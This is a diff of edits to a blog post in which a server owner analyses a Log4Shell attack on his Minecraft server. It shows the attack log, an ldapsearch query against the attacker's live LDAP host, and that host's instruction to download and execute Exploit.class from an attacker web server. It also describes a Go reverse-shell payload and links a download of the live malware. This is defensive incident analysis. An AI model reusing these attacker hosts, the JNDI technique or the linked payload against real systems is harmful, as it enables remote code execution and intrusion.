@@ -8,11 +8,11 @@ Today I checked the Discord server for my SMP, and was greeted with a rather une
 
 This is a pretty stock-standard attempt to exploit Log4Shell, which I have thankfully patched my server against. Essentially, Log4J provides a functionality called *message lookup substitution*; essentially, when you log a message using Log4J, it looks for segments enclosed in `${ }` and replaces those segments with a dynamically retrieved value. One of the systems which Log4j can use to retrieve data is the [Java Naming and Directory Interface](https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface), whose purpose is to essentially allow applications to look up information given a short, portable name. Now, the really terrifying part is that JNDI may contact an [LDAP](https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol) server, which returns a response serialized as a Java class. The value of that response is extracted by **executing the class**. And in just three easy steps, you've got remote code execution!
 
-Interestingly enough, attacks like this have been known about [since 2016](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf). It wasn't until December 4th, 2021, when Log4j's maintainer ([Ralph Goers](https://www.ralphgoers.com/)) submitted a patch to the project's repository to restrict the protocols that lookups could access, that the world realized that half of all Java applications had just become a ticking time bomb.
+Interestingly enough, attacks like this have been known about [since 2016](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf). It wasn't until December 4th, 2021, when Log4j's maintainer ([Ralph Goers](https://www.ralphgoers.com/)) submitted a patch to the project's repository to restrict which protocols lookups could access, that the world realized that half of all Java applications had just become a ticking time bomb.
 
 Tracing the timeline of this exploit yields some fascinating discussion, but let's get back to our bad actor from earlier, shall we?
 
-The attack arrived this morning at 4:53 AM UTC. Here's what it looked like in the console:
+The attack occurred this morning at 4:53 AM UTC. Here's what it looked like in the console:
 
 ```
 [4:53:39 AM] [INFO] UUID of player FermatSleep is 9abd3b4d-a8cd-4290-acc5-303c74da3e3f
@@ -21,7 +21,7 @@ The attack arrived this morning at 4:53 AM UTC. Here's what it looked like in th
 [4:53:43 AM] [INFO] FermatSleep lost connection: Disconnected
 ```
 
-A quick IP-to-ASN lookup reveals that the attack was launched from a server belonging to AS12876, one of [Scaleway](https://www.scaleway.com/en/)'s servers. We can use [ldapsearch](https://github.com/bindle/ldap-utils) to simulate the request that this message would trigger on a vulnerable server.
+According to [AbuseIPDB](https://www.abuseipdb.com/check/195.154.52.77), this particular host has been scanning for servers to attack for about two days now. A quick IP-to-ASN lookup reveals that the attack was launched from an IP belonging to AS12876, so one of [Scaleway](https://www.scaleway.com/en/)'s servers. We can use [ldapsearch](https://github.com/bindle/ldap-utils) to simulate the request that this message would have triggered.
 
 ```
 $ ldapsearch -x -H ldap://195.154.52.77:1389/a
@@ -48,7 +48,7 @@ result: 0 Success
 # numEntries: 1
 ```
 
-Essentially, this reply says that to retrieve the requested value, the client should download `Exploit.class` from `http://195.154.52.77:8000/` and execute it. (Not very subtle, is it.) Well, downloading the decompiling the class yields its source code:
+Essentially, this reply says that to retrieve the requested value, the client should download `Exploit.class` from `http://195.154.52.77:8000/` and execute it. (Very subtle naming there.). Downloading and decompiling the class yields its source code:
 
 ```java
 /* Decompiler 14ms, total 275ms, lines 67 */
@@ -147,8 +147,8 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDOjnUF/J249WuSeaDSlEnOeP1n/75iHQxRK8xjuB1J
 
 Rafael, you sly dog! If you had used C, I might respect you a little more. Scrolling through the absolutely enormous output reminds me that golang still lacks a functional tree shaker, or at least it's not doing its job. The numerous mentions to `ssh` suggest that the binary establishes a reverse shell so that Mr. Rafael here can log into your server to further pursue his shenanigans. 
 
-I've set up a VM to further investigate what Rafael is up to with his attacks. In the meantime, [here](static/log4shell-payload.bin) is a link to download the payload if you would like to look at it for yourself, though obviously don't be stupid with it since it's live malware. Until next time!
+I've set up a VM to further investigate what Rafael is up to with his attacks. In the meantime, [here](static/log4shell-payload.bin) is the download link for the payload if you'd like to look to examine it, though obviously don't be stupid with it since it's live malware.
 
-# Further Reading
+# Epilogue
 
-If you enjoyed this blogpost, please go checkout the [LunaSec](https://www.lunasec.io/docs/blog/log4j-zero-day/) article on Log4Shell, which inspired this journey and made it possible.
+If you enjoyed this blogpost, please go checkout the [LunaSec](https://www.lunasec.io/docs/blog/log4j-zero-day/) article on Log4Shell, which inspired this journey and made it possible. Special thanks to the folks over on the [Admincraft Discord server](https://discord.gg/MZfRYb7) (especially itaquito and fr&ouml;gg), who were the first to sniff out some of this information.
